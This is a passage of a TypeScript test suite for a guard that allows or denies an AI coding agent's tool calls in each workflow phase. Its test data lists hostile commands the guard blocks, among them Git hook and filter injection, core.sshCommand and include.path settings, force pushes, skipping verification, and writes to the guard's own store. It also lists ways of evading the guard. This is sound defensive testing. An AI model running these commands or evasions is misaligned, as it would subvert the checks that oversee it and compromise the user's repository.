    expect(edit(tool, 'changes/ABC-1/intent.md', 'Intent'), tool).toEqual({ verdict: 'deny', reason: INTENT_EDIT_TEXT })
    expect(edit(tool, '/repo/changes/ABC-1/intent.md', 'Intent'), tool).toEqual({ verdict: 'pass' })
    expect(edit(tool, '/repo/changes/ABC-1/intent.md', 'Intent', { root: '', real: { path: '/repo/changes/ABC-1/intent.md', root: '' } }), tool).toEqual({
      verdict: 'deny',
      reason: INTENT_EDIT_TEXT,
    })
  }
  expect(edit('Write', 'changes/ABC-1/approvals.md', 'Intent')).toEqual({ verdict: 'deny', reason: APPROVALS_TEXT })
  expect(edit('Write', 'src/a.ts', 'Build')).toEqual({ verdict: 'pass' })
})

// Every tool that runs a shell command, and the Intent phase's tools

const monitor = (command: string, phase: PhaseName) => guard({ tool: 'Monitor', input: { command, description: 'watch', timeout_ms: 1000 } }, ctxFor(phase))

test('Monitor is judged like Bash in every phase, and never pushes', () => {
  expect(monitor('echo x > changes/ABC-1/approvals.md', 'Build')).toEqual({ verdict: 'deny', reason: APPROVALS_TEXT })
  expect(monitor('sed -i s/a/b/ changes/ABC-1/run.json', 'Test')).toEqual({ verdict: 'deny', reason: RUN_FILE_TEXT })
  expect(monitor('git push --force', 'PR')).toEqual({ verdict: 'deny', reason: TARGET_TEXT })
  expect(monitor('gh pr merge 12', 'Build')).toEqual({ verdict: 'deny', reason: PR_TEXT })
  expect(monitor('git commit --no-verify -m x', 'Build')).toEqual({ verdict: 'deny', reason: VERIFY_TEXT })
  expect(monitor('git push origin sdd/ABC-1', 'PR')).toEqual({ verdict: 'deny', reason: TARGET_TEXT })
  expect(monitor('tail -f build.log', 'Build')).toEqual({ verdict: 'pass' })
  expect(guard({ tool: 'Monitor', input: { ws: { url: 'wss://x' } } }, ctxFor('Build'))).toEqual({ verdict: 'pass' })
})

test('the Intent phase allows only its tools', () => {
  expect(monitor('echo x > src/a.ts', 'Intent')).toEqual({ verdict: 'deny', reason: INTENT_TOOL_TEXT })
  const allowed: [string, Record<string, unknown>][] = [
    ['Read', { file_path: '/repo/src/a.ts' }],
    ['Glob', { pattern: '**/*.md' }],
    ['Grep', { pattern: 'x' }],
    ['Bash', { command: 'git status' }],
    ['Write', { file_path: '/repo/changes/ABC-1/intent.md', content: 'x' }],
    ['Edit', { file_path: '/repo/changes/ABC-1/intent.md', old_string: 'a', new_string: 'b' }],
    ['MultiEdit', { file_path: '/repo/changes/ABC-1/intent.md', edits: [] }],
    ['NotebookEdit', { notebook_path: '/repo/changes/ABC-1/n.ipynb', new_source: 'x' }],
    ['mcp__jira__getIssue', {}],
    ['AskUserQuestion', { questions: [] }],
    ['TodoWrite', { todos: [] }],
    ['TaskCreate', { subject: 'x', description: 'x' }],
    ['TaskGet', { taskId: '1' }],
    ['TaskList', {}],
    ['TaskUpdate', { taskId: '1' }],
    ['Skill', { skill: 'write-intent' }],
    ['ToolSearch', { query: 'x', max_results: 1 }],
  ]
  for (const [tool, input] of allowed) {
    const real = typeof input.file_path === 'string' ? input.file_path : input.notebook_path
    const ctx = ctxFor('Intent', typeof real === 'string' ? { real: { path: real, root: '/repo' } } : {})
    expect(guard({ tool, input }, ctx), tool).toEqual({ verdict: 'pass' })
  }
  for (const tool of ['Agent', 'Monitor', 'WebFetch', 'WebSearch', 'EnterWorktree', 'ExitWorktree', 'TaskStop', 'Workflow', 'FooTool']) {
    expect(guard({ tool, input: {} }, ctxFor('Intent')), tool).toEqual({ verdict: 'deny', reason: INTENT_TOOL_TEXT })
  }
  for (const tool of ['Agent', 'EnterWorktree', 'FooTool']) {
    expect(guard({ tool, input: {} }, ctxFor('Spec')), tool).toEqual({ verdict: 'pass' })
  }
  // WebFetch is refused from Spec on (AC-9).
  expect(guard({ tool: 'WebFetch', input: {} }, ctxFor('Spec')).verdict).toBe('deny')
})

// A call is judged by every rule that applies

test('an edit tool with an extra command field still gets every edit rule', () => {
  const call = (tool: string, path: string, command: string, phase: PhaseName) => {
    const field = tool === 'NotebookEdit' ? 'notebook_path' : 'file_path'
    return guard({ tool, input: { [field]: path, content: 'x', command } }, ctxFor(phase, { real: { path, root: '/repo' } }))
  }
  for (const tool of EDIT_TOOLS) {
    expect(call(tool, '/repo/src/a.ts', 'ls', 'Intent'), tool).toEqual({ verdict: 'deny', reason: INTENT_EDIT_TEXT })
    expect(call(tool, '/repo/src/a.ts', 'git status', 'Intent'), tool).toEqual({ verdict: 'deny', reason: INTENT_EDIT_TEXT })
    expect(call(tool, '/repo/changes/ABC-1/approvals.md', 'ls', 'Build'), tool).toEqual({ verdict: 'deny', reason: APPROVALS_TEXT })
    expect(call(tool, '/repo/.github/workflows/a.yml', 'ls', 'Build'), tool).toEqual({ verdict: 'deny', reason: CI_TEXT })
    expect(call(tool, '/repo/changes/ABC-1/intent.md', 'git status', 'Intent'), tool).toEqual({ verdict: 'pass' })
    expect(call(tool, '/repo/src/a.ts', 'ls', 'Build'), tool).toEqual({ verdict: 'pass' })
    expect(call(tool, '/repo/src/a.ts', 'git push --force', 'Build'), tool).toEqual({ verdict: 'deny', reason: PHASE_TEXT('Build') })
    expect(call(tool, '/repo/src/a.ts', 'git push origin sdd/ABC-1', 'PR'), tool).toEqual({ verdict: 'deny', reason: TARGET_TEXT })
  }
})

// More Jira write verbs, with their nouns and past forms as reads

test('the Intent phase denies a Jira tool that comments, moves, closes, logs, resolves, clones, archives or reopens', () => {
  for (const tool of [
    'mcp__jira__getAndCloseIssue',
    'mcp__jira__getIssueAndComment',
    'mcp__atlassian__jira_get_and_log_work',
    'mcp__jira__jira_get_and_log_work',
    'mcp__jira__getAndMoveIssue',
    'mcp__jira__getAndResolve',
    'mcp__jira__getAndCloneIssue',
    'mcp__jira__getAndArchive',
    'mcp__jira__getAndReopen',
    'mcp__jira__getIssueAndCommentOn',
    'mcp__jira__get_and_closeissue',
  ]) {
    expect(mcp(tool), tool).toEqual({ verdict: 'deny', reason: INTENT_MCP_TEXT })
    expect(isJiraRead(tool), tool).toBe(false)
  }
  expect(mcp('mcp__jira__getAndCloseIssue', 'Build')).toEqual({ verdict: 'pass' })
})

test('the reads of the ABC routing table and the nouns and past forms of the write verbs stay Jira reads', () => {
  const camel = ['getCurrentUser', 'getIssue', 'searchIssues', 'getProjects', 'getIssueTransitions', 'getComments']
  const snake = ['jira_get_user_profile', 'jira_get_issue', 'jira_search', 'jira_get_all_projects', 'jira_get_transitions']
  for (const server of ['jira', 'atlassian']) {
    for (const name of [...camel, ...snake]) expect(mcp(`mcp__${server}__${name}`), `${server} ${name}`).toEqual({ verdict: 'pass' })
  }
  for (const name of [
    'getIssueComments',
    'getClosedIssues',
    'jira_get_worklog',
    'getResolutions',
    'getResolvedIssues',
    'getArchivedProjects',
    'getMovedIssues',
    'getReopenedIssues',
    'getLinkedIssues',
    'getIssueLinks',
    'getWorkLogs',
    'getCommentedIssues',
  ]) {
    expect(mcp(`mcp__jira__${name}`), name).toEqual({ verdict: 'pass' })
    expect(isJiraRead(`mcp__jira__${name}`), name).toBe(true)
  }
  for (const name of [
    'transitionIssue',
    'updateIssue',
    'createIssue',
    'addComment',
    'uploadAttachment',
    'jira_transition_issue',
    'jira_update_issue',
    'jira_create_issue',
    'jira_add_comment',
    'jira_create_remote_issue_link',
  ]) {
    expect(mcp(`mcp__jira__${name}`), name).toEqual({ verdict: 'deny', reason: INTENT_MCP_TEXT })
  }
})

// Edits through a symbolic link the mod could not follow

test('every phase denies an edit that the mod could not place', () => {
  const unplaced = { real: { path: '', root: '/repo' } }
  for (const phase of PHASES) {
    for (const tool of EDIT_TOOLS) {
      for (const path of [
        '/repo/changes/ABC-1/s/approvals.md',
        'changes/ABC-1/s/a.md',
        '/repo/changes/ABC-2/x.md',
        '/repo/docs/ci.yml',
        '/repo/docs/t.ts',
        '/repo/docs/s.json',
      ]) {
        // Intent denies a path outside the change folder first, and a relative one, which it cannot anchor.
        const isOutside = phase === 'Intent' && !path.startsWith('/repo/changes/ABC-1/')
        const reason = isOutside ? INTENT_EDIT_TEXT : UNPLACED_TEXT
        expect(edit(tool, path, phase, unplaced), `${phase} ${tool} ${path}`).toEqual({ verdict: 'deny', reason })
      }
    }
  }
  for (const phase of PHASES.filter(name => name !== 'Intent')) {
    expect(edit('Write', '/repo/src/new.ts', phase, { real: { path: '/repo/src/new.ts', root: '/repo' } }), phase).toEqual({ verdict: 'pass' })
  }
  expect(edit('Write', '/repo/changes/ABC-1/a.md', 'Intent', { real: { path: '/repo/changes/ABC-1/a.md', root: '/repo' } })).toEqual({
    verdict: 'pass',
  })
})

// The mod's store

const STORE = '/Users/me/.claude/plugins/store'
const STORE_FILE = `${STORE}/goal-and-do_local-1a2b3c.json`

test('every phase denies an edit to the store, as spelled and where it lands', () => {
  const known = { storeDirs: [STORE, '/private/store-real'] }
  for (const phase of PHASES) {
    for (const tool of EDIT_TOOLS) {
      const spelled = edit(tool, STORE_FILE, phase, { ...known, real: { path: STORE_FILE, root: '/repo' } })
      expect(spelled, `${phase} ${tool}`).toEqual({ verdict: 'deny', reason: STORE_TEXT })
      const landed = edit(tool, '/repo/docs/s.json', phase, { ...known, real: { path: '/private/store-real/x.json', root: '/repo' } })
      expect(landed, `${phase} ${tool}`).toEqual({ verdict: 'deny', reason: STORE_TEXT })
      const tilde = edit(tool, '~/.claude/plugins/store/x.json', phase, known)
      expect(tilde, `${phase} ${tool}`).toEqual({ verdict: 'deny', reason: STORE_TEXT })
    }
  }
  const project = { ...known, real: { path: '/repo/src/plugins/store/a.ts', root: '/repo' } }
  expect(edit('Write', '/repo/src/plugins/store/a.ts', 'Build', project)).toEqual({ verdict: 'pass' })
})

test('with the store folder unknown, every phase denies an edit whose path has the parts plugins/store', () => {
  for (const phase of PHASES) {
    expect(edit('Write', STORE_FILE, phase, { real: { path: STORE_FILE, root: '/repo' } }), phase).toEqual({ verdict: 'deny', reason: STORE_TEXT })
    expect(edit('Edit', '/repo/docs/s.json', phase, { real: { path: '/x/plugins/store/y.json', root: '/repo' } }), phase).toEqual({
      verdict: 'deny',
      reason: STORE_TEXT,
    })
  }
  expect(edit('Write', '/repo/src/plugins/storefront.ts', 'Build', { real: { path: '/repo/src/plugins/storefront.ts', root: '/repo' } })).toEqual({
    verdict: 'pass',
  })
})

test('every phase denies a shell command that names the store', () => {
  const known = { storeDirs: [STORE] }
  for (const phase of PHASES) {
    for (const command of [
      `cat ${STORE_FILE}`,
      `echo {} > ${STORE_FILE}`,
      `echo {} >${STORE_FILE}`,
      'cat ~/.claude/plugins/store/x.json',
      'cp x $HOME/.claude/plugins/store/x.json',
      'sed -i s/a/b/ "$CLAUDE_CONFIG_DIR/plugins/store/x.json"',
      `rm ${STORE}/*.json`,
      `X=${STORE_FILE} npm test`,
    ]) {
      expect(run(command, phase, known), `${command} @ ${phase}`).toEqual({ verdict: 'deny', reason: STORE_TEXT })
    }
    expect(run('cat /tmp/plugins/store/x.json', phase), `unknown @ ${phase}`).toEqual({ verdict: 'deny', reason: STORE_TEXT })
  }
  // A word with the parts plugins/store is denied in every case, a project's own folder of that name included.
  expect(run('npm test src/plugins/store', 'Build', known)).toEqual({ verdict: 'deny', reason: STORE_TEXT })
  expect(run('cat src/plugins/store/a.ts', 'Build', known)).toEqual({ verdict: 'deny', reason: STORE_TEXT })
  expect(run('cat src/plugins/storefront.ts', 'Build', known)).toEqual({ verdict: 'pass' })
  expect(run('npm test', 'Build', known)).toEqual({ verdict: 'pass' })
})

test('a shell word that holds the store folder anywhere is denied, an interpreter script or a longer quoted string', () => {
  const known = { storeDirs: [STORE, '/private/store-real'] }
  for (const phase of PHASES.filter(name => name !== 'Intent')) {
    for (const command of [
      `python3 -c "open('${STORE_FILE}','w')"`,
      `node -e "require('fs').writeFileSync('${STORE_FILE}','{}')"`,
      'echo "copy it to .claude/plugins/store/x.json now"',
      'echo "the folder .claude/plugins/store"',
      `perl -e 'open(F, ">/private/store-real/x.json")'`,
    ]) {
      expect(run(command, phase, known), `${command} @ ${phase}`).toEqual({ verdict: 'deny', reason: STORE_TEXT })
    }
    for (const command of [`python3 -c "open('${STORE_FILE}','w')"`, 'echo "copy it to .claude/plugins/store/x.json now"']) {
      expect(run(command, phase), `${command} @ ${phase}, folder unknown`).toEqual({ verdict: 'deny', reason: STORE_TEXT })
    }
  }
})

// git by its bare name in the Intent phase

test('the Intent phase allows git only as the first word, not by path or behind a prefix', () => {
  for (const command of [
    '/usr/bin/git status',
    './git status',
    '/abs/path/git status',
    'bin/git status',
    'command git status',
    'builtin git status',
    'env git status',
    'env GIT_TERMINAL_PROMPT=0 git fetch origin',
    '{ git status; }',
    '! git status',
    'if git status; then git log; fi',
    'exec git status',
    'nohup git status',
    'time git status',
    'nice git status',
    'git status && /usr/bin/git log',
    'git status; command git log',
  ]) {
    expect(run(command, 'Intent'), command).toEqual({ verdict: 'deny', reason: INTENT_SHELL_TEXT })
  }
  for (const command of ['git status', 'GIT_TERMINAL_PROMPT=0 git fetch origin', "'git' status", 'git status && git log']) {
    expect(run(command, 'Intent'), command).toEqual({ verdict: 'pass' })
  }
})

test('the other phases keep their handling of git by path and behind a prefix', () => {
  for (const phase of PHASES.filter(name => name !== 'Intent')) {
    for (const command of ['/usr/bin/git status', 'command git status', 'env git status', '{ git status; }']) {
      expect(run(command, phase), `${command} @ ${phase}`).toEqual({ verdict: 'pass' })
    }
    expect(run('/usr/bin/git push --force', phase), phase).toEqual({
      verdict: 'deny',
      reason: phase === 'PR' ? TARGET_TEXT : PHASE_TEXT(phase),
    })
  }
  expect(run('/usr/bin/git push origin sdd/ABC-1')).toEqual({ verdict: 'push' })
})

// The reasons the pane shows

const MARKER = 'MARKER-1'
// The reasons whose text takes input: the path of a locked test and the phase of a push. A new reason with input fails the
// test below until it is listed here and the pane shows it without the input.
const CARRIES_INPUT = [
  'credentialStore',
  'envFile',
  'folderSearch',
  'mcpWrite',
  'outbound',
  'pushPhase',
  'reviewerClaudeMd',
  'steeringFile',
  'tests',
  'tokenPrint',
]

test('REASONS: only the reasons that name a phase, path, address or tool carry input, and no other result holds it', () => {
  const functions: string[] = []
  for (const [key, reason] of Object.entries(REASONS)) {
    if (typeof reason !== 'function') {
      expect(reason).not.toContain(MARKER)
      continue
    }
    functions.push(key)
    const call = reason as (...args: string[]) => string
    expect(call(...Array<string>(call.length).fill(MARKER))).toContain(MARKER)
  }
  expect(functions.sort()).toEqual(CARRIES_INPUT)
})

test('REASONS: every reason is one sentence or more of fixed text that names goal-and-do', () => {
  for (const [key, reason] of Object.entries(REASONS)) {
    const call = typeof reason === 'function' ? (reason as (...args: string[]) => string) : undefined
    const text = call === undefined ? String(reason) : call(...Array<string>(call.length).fill(''))
    expect(text, key).toMatch(/^goal-and-do /)
  }
})

test('git config: the value of a value-taking option is never read as a read action or a key', () => {
  for (const option of ['--comment', '-f', '--file', '--blob', '-t', '--type', '--default', '--value']) {
    const command = `git config ${option} -l core.hooksPath /x`
    expect(`${command}: ${JSON.stringify(run(command, 'Build'))}`).toBe(`${command}: ${JSON.stringify({ verdict: 'deny', reason: GIT_CONFIG_TEXT })}`)
    const joined = `git config ${option}=-l core.fsmonitor /x`
    expect(`${joined}: ${JSON.stringify(run(joined, 'Build'))}`).toBe(`${joined}: ${JSON.stringify({ verdict: 'deny', reason: GIT_CONFIG_TEXT })}`)
  }
  expect(run('git config --frobnicate -l core.hooksPath /x', 'Build')).toEqual({ verdict: 'deny', reason: GIT_CONFIG_TEXT })
  expect(run('git config -lz core.hooksPath /x', 'Build')).toEqual({ verdict: 'deny', reason: GIT_CONFIG_TEXT })
  for (const command of [
    'git config --file x.cfg --get core.hooksPath',
    'git config --type bool --get core.fsmonitor',
    'git config --default x --get core.hooksPath',
    'git config --comment x user.name y',
  ]) {
    expect(`${command}: ${JSON.stringify(run(command, 'Build'))}`).toBe(`${command}: ${JSON.stringify({ verdict: 'pass' })}`)
  }
})

test("during a run, every phase denies edits of Git's config, info and hooks, as spelled and where they land", () => {
  const edit = (file_path: string, phase: PhaseName, real?: string) =>
    guard({ tool: 'Write', input: { file_path, content: 'x' } }, ctxFor(phase, real === undefined ? {} : { real: { path: real, root: '/repo' } }))
  for (const phase of PHASES) {
    for (const path of [
      '.git/config',
      '/repo/.git/config',
      '/repo/.git/config.worktree',
      '/repo/.git/info/attributes',
      '/repo/.git/info/exclude',
      '/repo/.git/hooks/pre-commit',
      '/main/.git/worktrees/w/config.worktree',
      '/repo/.GIT/Config',
    ]) {
      expect(`${path} @ ${phase}: ${JSON.stringify(edit(path, phase))}`).toBe(
        `${path} @ ${phase}: ${JSON.stringify({ verdict: 'deny', reason: GIT_DIR_TEXT })}`
      )
    }
    expect(edit('/repo/src/link.sh', phase, '/repo/.git/hooks/pre-commit')).toEqual({ verdict: 'deny', reason: GIT_DIR_TEXT })
  }
  expect(edit('/repo/.git/goal-and-do/pr-body-ABC-1.md', 'PR')).toEqual({ verdict: 'pass' })
  expect(edit('/repo/.gitattributes', 'Build')).toEqual({ verdict: 'pass' })
  expect(edit('/repo/.github/CODEOWNERS', 'Build')).toEqual({ verdict: 'pass' })
})

test("during a run, every phase denies shell commands that name Git's config, info or hooks, and git config of include keys", () => {
  for (const phase of PHASES) {
    for (const command of [
      'printf "[filter \\"x\\"]" >> .git/config',
      'cat .git/info/exclude',
      'cp x.sh .git/hooks/pre-commit',
      'echo "* filter=x" > ".git/info/attributes"',
      'tee -a /repo/.git/config < x',
      "python3 -c \"open('.git/config', 'a').write('x')\"",
      'git config include.path ../x.cfg',
      'git config --add includeIf.gitdir:/repo/.path x.cfg',
      'git config set Include.Path x.cfg',
      'git -c include.path=x.cfg status',
    ]) {
      expect(`${command} @ ${phase}: ${JSON.stringify(run(command, phase))}`).toBe(
        `${command} @ ${phase}: ${JSON.stringify({ verdict: 'deny', reason: GIT_DIR_TEXT })}`
      )
    }
  }
  for (const command of ['git add .gitignore', 'cat .git/HEAD', 'echo x > .git/goal-and-do/pr-body-ABC-1.md', 'grep -r --exclude-dir=.git x src']) {
    expect(`${command}: ${JSON.stringify(run(command, 'Build'))}`).toBe(`${command}: ${JSON.stringify({ verdict: 'pass' })}`)
  }
  expect(reasonKeyOf(GIT_DIR_TEXT)).toBe('gitDir')
})

test('the edit tools may write nothing under .git/ but .git/goal-and-do/, as spelled and where they land', () => {
  const edit = (file_path: string, real?: string) =>
    guard({ tool: 'Write', input: { file_path, content: 'x' } }, ctxFor('Build', real === undefined ? {} : { real: { path: real, root: '/repo' } }))
  for (const path of [
    '/repo/.git/modules/x/config',
    '/repo/.git/modules/x/info/attributes',
    '/repo/.git/HEAD',
    '/repo/.git//config',
    '/repo/.git/./info/attributes',
    '/repo/.git',
    '/repo/.git/goal-and-do/../config',
    '/repo/.git/goal-and-do',
    '/repo/sub/.Git/objects/x',
  ]) {
    expect(`${path}: ${JSON.stringify(edit(path))}`).toBe(`${path}: ${JSON.stringify({ verdict: 'deny', reason: GIT_DIR_TEXT })}`)
  }
  expect(edit('/repo/src/a.ts', '/repo/.git/modules/x/config')).toEqual({ verdict: 'deny', reason: GIT_DIR_TEXT })
  expect(edit('/repo/.git/goal-and-do/pr-body-ABC-1.md')).toEqual({ verdict: 'pass' })
  expect(edit('/repo/.gitmodules')).toEqual({ verdict: 'pass' })
  expect(edit('/repo/src/.github/x.md')).toEqual({ verdict: 'pass' })
})

test("a shell command that names a submodule's git folder is denied", () => {
  for (const command of ['printf x >> .git/modules/x/config', 'cp a .git/modules/x/info/attributes']) {
    expect(run(command, 'Build')).toEqual({ verdict: 'deny', reason: GIT_DIR_TEXT })
  }
})

test('a shell word is normalized before the git folder match', () => {
  for (const command of [
    'printf x >> .git//modules/x/config',
    'cp a .git/goal-and-do/../modules/x/config',
    'echo x >> .git/goal-and-do/../config',
    'echo x > ./.git/./hooks/pre-commit',
  ]) {
    expect(`${command}: ${JSON.stringify(run(command, 'Build'))}`).toBe(`${command}: ${JSON.stringify({ verdict: 'deny', reason: GIT_DIR_TEXT })}`)
  }
  expect(run('echo x > .git/goal-and-do/pr-body-ABC-1.md', 'Build')).toEqual({ verdict: 'pass' })
})

test("the git folder rule reads an edit's path from the project root, so a .git folder above the root denies nothing", () => {
  const root = '/x/.git/repo'
  const edit = (file_path: string) => guard({ tool: 'Write', input: { file_path, content: 'x' } }, ctxFor('Build', { root, real: { path: file_path, root } }))
  expect(edit('/x/.git/repo/src/a.ts')).toEqual({ verdict: 'pass' })
  expect(edit('/x/.git/repo/.git/config')).toEqual({ verdict: 'deny', reason: GIT_DIR_TEXT })
  expect(guard({ tool: 'Write', input: { file_path: 'src/a.ts', content: 'x' } }, ctxFor('Build', { root }))).toEqual({ verdict: 'pass' })
  expect(edit('/other/.git/config')).toEqual({ verdict: 'deny', reason: GIT_DIR_TEXT })
})

// Git's config and attributes files of the user

const HOME_CTX = { home: '/Users/me' }
const userEdit = (tool: string, file: string, phase: PhaseName, overrides: Partial<Ctx> = HOME_CTX, real = file) =>
  guard(
    { tool, input: { [tool === 'NotebookEdit' ? 'notebook_path' : 'file_path']: file } },
    ctxFor(phase, { real: { path: real, root: '/repo' }, ...overrides })
  )

test("the edit tools may not write the user's Git config or attributes, in every phase", () => {
  for (const phase of PHASES) {
    for (const tool of EDIT_TOOLS) {
      for (const file of ['/Users/me/.gitconfig', '/Users/me/.config/git/config', '/Users/me/.config/git/attributes', '/Users/Me/.GitConfig']) {
        expect(`${tool} ${file} @ ${phase}: ${JSON.stringify(userEdit(tool, file, phase))}`).toBe(
          `${tool} ${file} @ ${phase}: ${JSON.stringify({ verdict: 'deny', reason: GIT_DIR_TEXT })}`
        )
      }
    }
  }
  expect(userEdit('Write', '/repo/src/a.ts', 'Build', HOME_CTX, '/Users/me/.gitconfig')).toEqual({ verdict: 'deny', reason: GIT_DIR_TEXT })
  expect(userEdit('Write', '/repo/docs/.gitconfig', 'Build')).toEqual({ verdict: 'pass' })
  expect(userEdit('Write', '/repo/src/git/config', 'Build')).toEqual({ verdict: 'pass' })
  expect(userEdit('Write', '/Users/me/notes.md', 'Build')).toEqual({ verdict: 'pass' })
})

test("the user's Git files follow XDG_CONFIG_HOME, and ~/.config stays guarded too", () => {
  const xdg = { home: '/Users/me', xdgConfigHome: '/Users/me/xdg' }
  for (const file of ['/Users/me/xdg/git/config', '/Users/me/xdg/git/attributes', '/Users/me/.config/git/config', '/Users/me/.gitconfig']) {
    expect(`${file}: ${JSON.stringify(userEdit('Write', file, 'Build', xdg))}`).toBe(`${file}: ${JSON.stringify({ verdict: 'deny', reason: GIT_DIR_TEXT })}`)
  }
  expect(userEdit('Write', '/Users/me/xdg/other/config', 'Build', xdg)).toEqual({ verdict: 'pass' })
})

test('with the home folder unknown, any path ending in /.gitconfig, or in git/config or git/attributes under .config, is denied', () => {
  for (const file of ['/home/x/.gitconfig', '/a/.config/git/config', '/a/.config/git/attributes', '/repo/sub/.gitconfig']) {
    expect(`${file}: ${JSON.stringify(userEdit('Write', file, 'Build', {}))}`).toBe(`${file}: ${JSON.stringify({ verdict: 'deny', reason: GIT_DIR_TEXT })}`)
  }
  expect(userEdit('Write', '/repo/src/git/config', 'Build', {})).toEqual({ verdict: 'pass' })
  expect(userEdit('Write', '/repo/gitconfig', 'Build', {})).toEqual({ verdict: 'pass' })
})

test("a shell command that names the user's Git config or attributes is denied, in every phase", () => {
  for (const phase of PHASES) {
    for (const command of [
      'echo x >> ~/.gitconfig',
      'printf "[filter \\"a\\"]\\n clean = sh" >> $HOME/.gitconfig',
      'cat > ${HOME}/.gitconfig',
      'cp a /Users/me/.gitconfig',
      'tee -a ~/.config/git/config',
      'echo "* filter=a" >> ~/.config/git/attributes',
      'echo x >> $XDG_CONFIG_HOME/git/config',
      'echo x >> ${XDG_CONFIG_HOME}/git/attributes',
      'echo x >> ~/.config/git/./config',
      'echo x >> ~/{.gitconfig,a}',
      'echo x >> ../../Users/me/.gitconfig',
    ]) {
      expect(`${command} @ ${phase}: ${JSON.stringify(run(command, phase, HOME_CTX))}`).toBe(
        `${command} @ ${phase}: ${JSON.stringify({ verdict: 'deny', reason: GIT_DIR_TEXT })}`
      )
    }
  }
  for (const command of ['cat docs/.gitconfig', 'ls src/git/config', 'echo gitconfig']) {
    expect(`${command}: ${JSON.stringify(run(command, 'Build', HOME_CTX))}`).toBe(`${command}: ${JSON.stringify({ verdict: 'pass' })}`)
  }
  expect(run('echo x >> /Users/me/xdg/git/config', 'Build', { home: '/Users/me', xdgConfigHome: '/Users/me/xdg' })).toEqual({
    verdict: 'deny',
    reason: GIT_DIR_TEXT,
  })
  expect(run('echo x >> /home/x/.gitconfig', 'Build')).toEqual({ verdict: 'deny', reason: GIT_DIR_TEXT })
})

// Git's own options before the subcommand

test("git's options before the subcommand are skipped with their values, so the subcommand is the one git runs", () => {
  for (const command of [
    'git --namespace x config core.hooksPath /h',
    'git --namespace=x config core.hooksPath /h',
    'git --exec-path /x config --add filter.a.clean b',
    'git --exec-path=/x config --add filter.a.clean b',
    'git --config-env=core.hooksPath=H status',
    'git --config-env core.hooksPath=H status',
    'git --attr-source x config diff.a.textconv b',
    'git --super-prefix x config core.fsmonitor y',
    'git --list-cmds=x config core.fsmonitor y',
    'git --no-pager --namespace x -p config filter.a.smudge b',
    'git --frobnicate config core.fsmonitor x',
    'git --frobnicate x config core.fsmonitor y',
    'git --frobnicate x y set filter.a.clean b',
  ]) {
    expect(`${command}: ${JSON.stringify(run(command, 'Build'))}`).toBe(`${command}: ${JSON.stringify({ verdict: 'deny', reason: GIT_CONFIG_TEXT })}`)
  }
  for (const command of ['git --namespace x config include.path y', 'git --frobnicate x config includeIf.gitdir:/a.path y']) {
    expect(`${command}: ${JSON.stringify(run(command, 'Build'))}`).toBe(`${command}: ${JSON.stringify({ verdict: 'deny', reason: GIT_DIR_TEXT })}`)
  }
})

test('a push behind git options is a push: denied outside PR, and not the allowed push in PR', () => {
  for (const command of [
    'git --namespace x push origin main',
    'git --namespace=x push origin sdd/ABC-1',
    'git --frobnicate x push origin sdd/ABC-1',
    'git --frobnicate push origin sdd/ABC-1',
  ]) {
    expect(`${command}: ${JSON.stringify(run(command, 'Build'))}`).toBe(`${command}: ${JSON.stringify({ verdict: 'deny', reason: PHASE_TEXT('Build') })}`)
    expect(`${command}: ${JSON.stringify(run(command, 'PR'))}`).toBe(`${command}: ${JSON.stringify({ verdict: 'deny', reason: TARGET_TEXT })}`)
  }
})

test('known git options with nothing guarded behind them pass', () => {
  for (const command of [
    'git --no-pager log',
    'git -C . status',
    'git -P log --oneline',
    'git --namespace x log',
    'git --literal-pathspecs status',
    'git --frobnicate log',
  ]) {
    expect(`${command}: ${JSON.stringify(run(command, 'Build'))}`).toBe(`${command}: ${JSON.stringify({ verdict: 'pass' })}`)
  }
})

// Git's options before the subcommand, read by one parser

test('a -c, --config-env, -C, --git-dir or --work-tree behind a valued git option gets its own check', () => {
  const valued = [
    '--namespace x',
    '--namespace=x',
    '--attr-source HEAD',
    '--attr-source=HEAD',
    '--shallow-file f',
    '--super-prefix p',
    '--exec-path /x',
    '--list-cmds=x',
    '--no-pager --namespace x',
  ]
  for (const before of valued) {
    const cases: [string, string][] = [
      [`git ${before} -c core.hooksPath=/h commit -m x`, GIT_CONFIG_TEXT],
      [`git ${before} -c core.fsmonitor=/x status`, GIT_CONFIG_TEXT],
      [`git ${before} -ccore.fsmonitor=/x status`, GIT_CONFIG_TEXT],
      [`git ${before} -c include.path=/x status`, GIT_DIR_TEXT],
      [`git ${before} --config-env=core.hooksPath=H status`, GIT_CONFIG_TEXT],
      [`git ${before} --config-env core.hooksPath=H status`, GIT_CONFIG_TEXT],
      [`git ${before} -c user.name=x commit -m x`, TARGET_TEXT],
      [`git ${before} -C ../other status`, TARGET_TEXT],
      [`git ${before} --git-dir=../o/.git log`, TARGET_TEXT],
      [`git ${before} --git-dir ../o/.git log`, TARGET_TEXT],
      [`git ${before} --work-tree=../o status`, TARGET_TEXT],
    ]
    for (const [command, reason] of cases) {
      expect(`${command}: ${JSON.stringify(run(command, 'Build'))}`).toBe(`${command}: ${JSON.stringify({ verdict: 'deny', reason })}`)
    }
  }
})

test('a -c, -C, --git-dir or --work-tree behind an option the guard does not know is denied', () => {
  for (const command of [
    'git --frobnicate x -C ../other status',
    'git --frobnicate x --git-dir=../o/.git log',
    'git --frobnicate x --work-tree ../o status',
    'git --frobnicate x -c user.name=y status',
    'git --frobnicate x --config-env=a=B status',
  ]) {
    expect(`${command}: ${JSON.stringify(run(command, 'Build'))}`).toBe(`${command}: ${JSON.stringify({ verdict: 'deny', reason: TARGET_TEXT })}`)
  }
})

// git clone and git submodule

test('git clone and git submodule may not set a guarded key through their own config options', () => {
  for (const command of [
    'git clone -c filter.sf.clean=evil src sub',
    'git clone --config filter.sf.clean=evil src sub',
    'git clone --config=core.hooksPath=/h src sub',
    'git clone -ccore.fsmonitor=x src sub',
    'git clone src sub -c diff.a.textconv=x',
    'git clone -c core.sshCommand=x src sub',
    'git submodule add -c filter.a.clean=x ../s s',
    'git submodule foreach "git config core.hooksPath /h"',
  ]) {
    expect(`${command}: ${JSON.stringify(run(command, 'Build'))}`).toBe(`${command}: ${JSON.stringify({ verdict: 'deny', reason: GIT_CONFIG_TEXT })}`)
  }
  expect(run('git clone -c include.path=/x src sub', 'Build')).toEqual({ verdict: 'deny', reason: GIT_DIR_TEXT })
  expect(run(`git submodule foreach "git push origin sdd/ABC-1"`, 'PR')).toEqual({ verdict: 'deny', reason: TARGET_TEXT })
  for (const command of [
    'git clone src sub',
    'git clone -c core.autocrlf=false src sub',
    'git submodule update --init',
    'git submodule foreach "git status"',
  ]) {
    expect(`${command}: ${JSON.stringify(run(command, 'Build'))}`).toBe(`${command}: ${JSON.stringify({ verdict: 'pass' })}`)
